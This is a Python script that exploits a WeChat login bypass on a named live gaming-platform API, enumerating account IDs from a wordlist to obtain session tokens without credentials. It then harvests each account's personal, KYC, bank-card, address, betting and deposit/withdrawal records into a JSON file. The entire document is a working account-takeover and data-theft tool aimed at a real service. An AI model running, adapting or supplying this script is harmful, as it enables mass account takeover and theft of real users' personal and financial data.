#!/usr/bin/env python3
"""
Vuln ID: 1fff1e6c-c53a-4903-88c2-2f18a466e0db
Project: ttww
Target: https://apib63.bf1788.com/boxApi.php

WechatLogin Account Takeover — Full Member Data Enumeration & Extraction Tool
Usage:
    python3 extract_all_members.py                      # enumerate from wechatId wordlist
    python3 extract_all_members.py --wechatid <ID>    # extract single account
    python3 extract_all_members.py --wordlist <file>  # custom wordlist
"""
import requests, urllib3, json, time, argparse, sys, os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()
TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}
TIMEOUT = 10

# All sid-authenticated endpoints discovered
MEMBER_ENDPOINTS = [
    (101,  "會員基本資料"),
    (208,  "財務摘要"),
    (300,  "遊戲大廳列表"),
    (301,  "遊戲分組"),
    (302,  "遊戲列表"),
    (511,  "遊戲啟動URL"),
    (707,  "支付方式"),
    (800,  "VIP日統計"),
    (802,  "VIP總結"),
    (904,  "VIP等級"),
    (910,  "KYC驗證"),
    (111,  "推廣活動"),
    (210,  "系統設定"),
    (211,  "投注記錄"),
    (607,  "週投注記錄"),
    (608,  "投注統計"),
    (702,  "充值記錄"),
    (703,  "提款記錄"),
    (704,  "轉帳記錄"),
    (705,  "紅利記錄"),
    (706,  "返水記錄"),
    (708,  "交易歷史"),
    (902,  "銀行卡列表"),
    (903,  "收貨地址"),
    (905,  "安全設定"),
]

def login_bypass(wechat_id):
    """Exploit WechatLogin bypass (cmd=1000) to get sid + username"""
    params = {"cmd": "1000", "wechatId": wechat_id, "sid": "", **BASE_PARAMS}
    try:
        r = requests.post(f"{TARGET}?cmd=1000", data=params, timeout=TIMEOUT, verify=False)
        data = r.json()
        if data.get("status") == "0" or data.get("status") == 0:
            msg = data.get("msg", {})
            return {"success": True, "sid": msg.get("sid"), "username": msg.get("username"), "wechat_id": wechat_id}
        elif data.get("status") == -1001 or "帳號不存在" in str(data.get("msg", "")):
            return {"success": False, "reason": "account_not_found", "response": data}
        else:
            return {"success": False, "reason": "other", "response": data}
    except Exception as e:
        return {"success": False, "reason": "error", "error": str(e)}

def extract_member_data(sid, username, wechat_id):
    """Extract all member data via sid-authenticated endpoints"""
    results = {}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for cmd, desc in MEMBER_ENDPOINTS:
        params = {"cmd": str(cmd), "sid": sid, "username": username, "wechatId": wechat_id, **BASE_PARAMS}
        try:
            r = requests.post(f"{TARGET}?cmd={cmd}", data=params, timeout=TIMEOUT, verify=False, headers=headers)
            results[f"cmd_{cmd}_{desc}"] = {"http_status": r.status_code, "response": r.text.strip()[:2000]}
        except Exception as e:
            results[f"cmd_{cmd}_{desc}"] = {"error": str(e)}
        time.sleep(0.1)
    return results

def is_test_account(member_data):
    """Check if this is a real account vs test account"""
    cmd_101 = member_data.get("cmd_101_會員基本資料", {}).get("response", "")
    if not cmd_101:
        return True
    try:
        data = json.loads(cmd_101)
        msg = data.get("msg", {})
        # Test accounts have empty phone, email, truename="TestUser", balance=0
        if msg.get("truename") == "TestUser" and not msg.get("phone") and not msg.get("email"):
            return True
    except:
        pass
    return False

def main():
    parser = argparse.ArgumentParser(description="bf1788 WechatLogin Member Data Extraction")
    parser.add_argument("--wechatid", help="Single wechatId to target")
    parser.add_argument("--wordlist", default="/usr/share/wordlists/fasttrack.txt", help="wechatId wordlist")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    parser.add_argument("--output", default="all_members_extracted.json", help="Output file")
    args = parser.parse_args()

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-{timestamp}"
    os.makedirs(output_dir, exist_ok=True)

    if args.wechatid:
        # Single account extraction
        wechat_ids = [args.wechatid]
    else:
        # Load wordlist
        with open(args.wordlist, "r", errors="ignore") as f:
            wechat_ids = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(wechat_ids)} wechatIds from {args.wordlist}")

    # Step 1: Enumerate valid accounts via login bypass
    print(f"[*] Phase 1: Enumerating valid wechatIds (login bypass)...")
    valid_accounts = []

    def try_login(wid):
        result = login_bypass(wid)
        if result["success"]:
            return result
        return None

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(try_login, wid): wid for wid in wechat_ids}
        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            if result:
                valid_accounts.append(result)
                print(f"  [+] FOUND: wechatId={result['wechat_id']} → sid={result['sid'][:16]}... username={result['username']}")
            if i % 100 == 0:
                print(f"  ... checked {i}/{len(wechat_ids)}")

    print(f"\n[*] Phase 1 complete: {len(valid_accounts)} valid accounts found")

    # Step 2: Extract full member data for each account
    print(f"\n[*] Phase 2: Extracting member data for {len(valid_accounts)} accounts...")
    all_extracted = {}
    for acc in valid_accounts:
        print(f"\n[!] Extracting: {acc['wechat_id']} (sid={acc['sid'][:16]}..., username={acc['username']})")
        member_data = extract_member_data(acc["sid"], acc["username"], acc["wechat_id"])
        is_test = is_test_account(member_data)
        all_extracted[acc["wechat_id"]] = {
            "wechat_id": acc["wechat_id"],
            "sid": acc["sid"],
            "username": acc["username"],
            "is_test_account": is_test,
            "extracted_at": datetime.now().isoformat(),
            "member_data": member_data,
        }

    # Save results
    output_file = os.path.join(output_dir, args.output)
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(all_extracted, f, ensure_ascii=False, indent=2)

    print(f"\n{'='*60}")
    print(f"[✓] Extraction complete!")
    print(f"    Output: {output_file}")
    print(f"    Accounts extracted: {len(all_extracted)}")
    print(f"    Real accounts: {sum(1 for v in all_extracted.values() if not v['is_test_account'])}")
    print(f"    Test accounts: {sum(1 for v in all_extracted.values() if v['is_test_account'])}")

if __name__ == "__main__":
    main()
